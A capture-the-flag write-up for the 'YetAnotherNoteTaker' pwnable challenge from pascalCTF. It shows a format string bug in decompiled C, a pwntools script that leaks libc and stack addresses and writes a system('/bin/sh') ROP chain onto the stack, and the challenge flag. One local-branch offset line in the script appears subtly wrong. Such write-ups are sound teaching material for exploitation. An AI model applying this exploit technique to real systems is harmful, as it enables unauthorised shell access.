# YetAnotherNoteTaker

## 1. Summary

- **Category**: Pwnable
- **Points**: 413
- **Solves**: 222

### Description

> `I've read too many notes recently, I can't take it anymore...`

## 2. Analysis

### Checksec

```text
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RPATH:    b'./libs/'
    Stripped: No
```

### Vulnerability

```c
undefined8 main(EVP_PKEY_CTX *param_1)
{
  if (local_124 == 2) {
    printf("Enter the note: ");
    read(0,local_118,0x100);
    sVar1 = strcspn(local_118,"\n");
    local_118[sVar1] = '\0';
  }
  else if (local_124 == 1) {
    printf(local_118);
    putchar(10);
  }
}
```

The program takes user input into `local_118` and passes it directly as the first argument to `printf`. This is a classic Format String Bug (FSB) vulnerability, allowing arbitrary memory reads and writes.

## 3. Exploit Flow

1. **Identify Offset**: By providing `%p.%p...` as input, the user-controlled buffer was found to start at the 8th index on the stack.
2. **Information Leak**:
   - The 43rd index contains the address of `__libc_start_main+240`, which is used to calculate the Libc base address.
   - The 40th index contains a stack pointer. By calculating the constant offset (0xD8), the return address location on the stack (`stack_ret`) is identified.
3. **ROP Chain via FSB**: Since the binary has Full RELRO but No PIE, and we have the stack return address, we can use the FSB to write a ROP chain (`system("/bin/sh")`) directly onto the stack.
4. **Execution**: The ROP chain is written 8 bytes at a time using `fmtstr_payload`. Once the loop exits, the program returns to the ROP chain and executes the shell.

## 4. Final Solution

- **Exploit Code**: [Link to Script / GitHub](./solve.py)

```python
# Leaking addresses
write_note(r, b"%40$p %43$p")
read_note(r)
res = r.recvline().decode()
stack, main_ret = map(lambda x: int(x, 16), res.split())

stack_ret = stack - 0xD8 if "remote" in sys.argv else 0xD0
libc.address = main_ret - libc.libc_start_main_return

# Building ROP Chain via FSB
rop = ROP(libc)
sh = next(libc.search(b"/bin/sh\0"))
rop.system(sh)
chain = rop.chain()

for i in range(0, len(chain), 8):
    payload = fmtstr_payload(8, {stack_ret + i: u64(chain[i : i + 8].ljust(8, b"\0"))})
    write_note(r, payload)
    read_note(r)

exit_program(r)
```

## 5. Flag

`pascalCTF{d1d_y0u_fr_h00k3d_th3_h3ap?}`
